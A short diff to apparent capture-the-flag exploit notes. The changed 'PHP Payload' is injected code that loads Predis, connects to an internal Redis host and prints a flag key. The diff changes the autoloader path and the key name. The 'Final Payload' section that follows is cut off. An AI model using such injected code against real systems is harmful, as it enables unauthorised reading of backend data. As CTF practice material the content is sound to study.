@@ -3,7 +3,7 @@
 
 ## PHP Payload
 ```
-require __DIR__ . '/../vendor/autoload.php'; $redis = new Predis\Client('tcp://redis:6379'); echo $redis->get("flag_super_idol");
+require '/var/www/html/vendor/autoload.php'; $redis = new Predis\Client('tcp://redis:6379'); echo $redis->get("flag_gwej_anime");
 ```
 
 ## Final Payload
